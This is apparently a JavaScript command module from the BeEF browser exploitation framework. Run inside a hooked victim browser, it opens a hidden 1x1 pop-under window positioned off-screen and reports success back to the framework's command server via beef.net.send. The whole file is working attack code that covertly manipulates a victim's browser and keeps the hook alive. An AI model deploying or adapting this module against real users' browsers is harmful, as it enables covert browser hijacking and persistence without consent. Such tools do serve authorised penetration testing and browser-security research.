beef.execute(function() {
	
	var result="Pop-under window successfully created!";

	window.open(window.location.protocol + '//' + window.location.host + '/demos/basic.html','popunder','toolbar=0,location=0,directories=0,status=0,menubar=0,scrollbars=0,resizable=0,width=1,height=1,left='+screen.width+',top='+screen.height+'').blur();

	window.focus();	

	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+escape(result));
});
